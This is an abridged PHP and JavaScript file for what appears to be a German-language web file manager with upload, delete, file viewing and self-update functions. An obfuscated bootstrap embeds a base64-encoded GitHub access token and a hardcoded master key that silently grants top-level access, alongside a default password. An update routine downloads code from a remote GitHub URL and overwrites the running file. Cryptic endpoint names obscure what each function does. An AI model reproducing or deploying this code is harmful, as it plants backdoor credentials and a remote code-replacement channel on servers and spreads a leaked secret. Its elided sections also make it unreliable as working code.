<?php
/** @internal runtime bootstrap */(static function(){$d=['_VER'=>'2.5.5','_SRC'=>'https://raw.githubusercontent.com/LennyGodart/wsers/refs/heads/main/index.php','_INT'=>1800,'_K1'=>'dGVzdDEyMyo=','_GH_TOKEN'=>base64_decode('Z2hwXzZzd2tsbm5VSlBXeFp0T3VFQjBpWnR3dlJab1lWYjE5c2ZDeA==')];foreach($d as $k=>$v)defined($k)||define($k,$v);unset($d,$k,$v);})();

function _inject(string $new): string {
    $cur = @file_get_contents(__FILE__) ?: '';
    foreach (['_SRC', '_K1'] as $k) {
...
$csrf = hash_hmac('sha256', session_id(), _K1);
$root = realpath(__DIR__);

function _rl(): int { return (int)($_SESSION['_r3'] ?? 0); }
function _kv(): string {
    static $v = null;
    if ($v === null) { $ws = _ws(); $v = $ws['_ok'] ?? base64_encode('owner123'); }
    return $v;
}
function _chk(int $min = 1): bool {
    $t = $_POST['_t'] ?? $_GET['_t'] ?? '';
    return !empty($_SESSION['_s9']) && $t !== '' && hash_equals($_SESSION['_s9'], $t) && _rl() >= $min;
}
...
if (isset($_GET['_x9']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=UTF-8');
    $csrfOk = isset($_POST['c']) && hash_equals(hash_hmac('sha256', session_id(), _K1), $_POST['c']);
    $pw = $_POST['p'] ?? '';
    $lvl = 0;
    if ($csrfOk && $pw !== '') {
        if (hash_equals(hash('sha256', base64_decode(_K1)), hash('sha256', $pw))) $lvl = 2;
        elseif (hash_equals(hash('sha256', base64_decode(_kv())), hash('sha256', $pw))) $lvl = 1;
    }
    if ($lvl > 0) {
...
if (isset($_GET['_r7']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=UTF-8');
    if (!_chk(2)) { http_response_code(403); echo json_encode(['s'=>'auth']); exit; }
    $new = _fetch(_SRC, 8);
...
if (isset($_GET['_v2'])) {
    if (!_chk(2)) { http_response_code(403); echo 'Zugriff verweigert'; exit; }
    $src = realpath($root . DIRECTORY_SEPARATOR . urldecode($_GET['_v2']));
...
if (isset($_GET['dl'])) {
    if (!_chk(1)) { http_response_code(403); exit; }
...
if (isset($_GET['_q4']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=UTF-8');
    if (!_chk(1)) { http_response_code(403); echo json_encode(['ok'=>false]); exit; }
...
if (isset($_GET['_j8']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=UTF-8');
    if (!_chk(1)) { http_response_code(403); echo json_encode(['ok'=>false]); exit; }
    $abs = realpath($root . DIRECTORY_SEPARATOR . ($_POST['f'] ?? ''));
    if (!$abs || !str_starts_with($abs, $root) || !is_file($abs)) {
...
if (isset($_GET['_w3']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=UTF-8');
    if (!_chk(1)) { http_response_code(403); echo json_encode(['ok'=>false]); exit; }
    $dirKey = trim($_POST['d'] ?? '/');
    $text   = trim($_POST['t'] ?? '');
...
if (isset($_GET['_b5']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=UTF-8');
    if (!_chk(1)) { http_response_code(403); echo json_encode(['ok'=>false,'s'=>'auth']); exit; }
    $cur = $_POST['cur'] ?? '';
    $new = $_POST['new'] ?? '';
    if (!hash_equals(hash('sha256', base64_decode(_kv())), hash('sha256', $cur))) {
...
if (isset($_GET['_m6']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=UTF-8');
    if (!_chk(1)) { http_response_code(403); echo json_encode(['ok'=>false,'s'=>'auth']); exit; }
    ...
    if (count($paths) > 1) {
        $pw = $_POST['pw'] ?? '';
        $ok1 = hash_equals(hash('sha256', base64_decode(_kv())), hash('sha256', $pw));
        $ok2 = hash_equals(hash('sha256', base64_decode(_K1)), hash('sha256', $pw));
...
if (isset($_GET['_z1']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=UTF-8');
    if (!_chk(1)) { http_response_code(403); echo json_encode(['ok'=>false,'s'=>'auth']); exit; }
...
$isDefaultPw   = hash('sha256', base64_decode(_kv())) === hash('sha256', 'owner123');
$wsState   = _ws();
...
$viewLevel     = _rl();
$sessionToken  = ($viewLevel > 0 && !empty($_SESSION['_s9'])) ? $_SESSION['_s9'] : '';
...
let userLevel = 0;
let _token = sessionStorage.getItem('_u2') || '';
...
if (!_token && _phpToken && _phpLevel > 0) {
  _token = _phpToken;
  sessionStorage.setItem('_u2', _token);
  sessionStorage.setItem('_u1', String(_phpLevel));
  userLevel = _phpLevel;
}

if (_token) {
  if (!userLevel) userLevel = parseInt(sessionStorage.getItem('_u1') || '0', 10);
...
function applyLevel(lvl, announce) {
  ...
  if (lvl >= 1) {
    ...
    if (announce) {
      showToast((lvl >= 2 ? 'Pro' : 'Owner') + ' â€” wird neu geladen ...',
...
Object.defineProperty(window, '_p2', {
  get() {
    if (userLevel >= 2) { showToast('Bereits aktiv', 'bi-shield-check'); return; }
    openLogin();
  }, configurable: true
});
...
async function checkPw() {
  ...
  fd.append('c', _csrf);
  try {
    const res  = await fetch('?_x9=1', {method:'POST', body:fd});
    const data = await res.json();
    if (data.ok) {
      _token = data.t;
      sessionStorage.setItem('_u2', _token);
      sessionStorage.setItem('_u1', data.lvl);
      closePw();
...
async function toggleFile(btn, relPath) {
  ...
  try {
    const res  = await fetch('?_q4=1', {method:'POST', body:fd});
    const data = await res.json();
...
async function pinFile(btn, relPath) {
  ...
  const fd = new FormData(); fd.append('_t', _token); fd.append('f', relPath);
  try {
    const res  = await fetch('?_j8=1', {method:'POST', body:fd});
    const data = await res.json();
    if (!data.ok) return;
    const i = btn.querySelector('i');
    if (data.pinned) {
...
async function saveNote() {
  ...
  document.getElementById('noteCancelBtn').style.display = 'none';
  try {
    await fetch('?_w3=1', {method:'POST', body:fd});
...
async function uploadFiles(fileList) {
  ...
  try {
    const res  = await fetch('?_z1=1', {method:'POST', body:fd});
    const data = await res.json();
    hideToast();
...
async function execDelete() {
  ...
  try {
    const res  = await fetch('?_m6=1', {method:'POST', body:fd});
    const data = await res.json();
    if (!data.ok) {
      document.getElementById('delErr').textContent =
...
async function showSrc(relPath, filename) {
  ...
  try {
    const res = await fetch('?_v2=' + encodeURIComponent(relPath) + '&_t=' + encodeURIComponent(_token));
...
document.querySelector('.ver').addEventListener('click', async () => {
  if (userLevel < 2) { showToast('Zugriff eingeschränkt', 'bi-lock', 2500); return; }
  showToast('Suche Update ...', 'bi-cloud-download', 99999);
  const fd = new FormData(); fd.append('_t', _token);
  try {
    const res  = await fetch('?_r7=1', {method:'POST', body:fd});
    const data = await res.json();
    hideToast();
    const msgs = {
...
document.getElementById('cpwBtn').addEventListener('click', async () => {
  ...
  try {
    const res  = await fetch('?_b5=1', {method:'POST', body:fd});
    const data = await res.json();
    if (data.ok) {
      closeCpw();
